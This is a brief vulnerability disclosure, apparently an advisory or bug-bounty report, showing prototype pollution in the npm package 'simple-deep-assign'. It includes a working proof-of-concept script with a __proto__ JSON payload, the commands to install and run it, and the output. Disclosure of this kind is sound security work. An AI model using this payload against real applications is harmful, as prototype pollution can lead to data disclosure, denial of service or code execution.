# Description

`simple-deep-assign` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.mjs
import deepAssign from 'simple-deep-assign';

console.log(`Before: ${{}.polluted}`)
deepAssign({}, JSON.parse('{"__proto__": {"polluted": "Prototype Polluted"}}'));
console.log(`After: ${{}.polluted}`)
```
2. Execute the following commands in the terminal:
```bash
npm i simple-deep-assign # install vulnerable package
node poc.mjs # run the PoC
```
3. Check the output:
```
Before: undefined
After: Prototype Polluted
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.
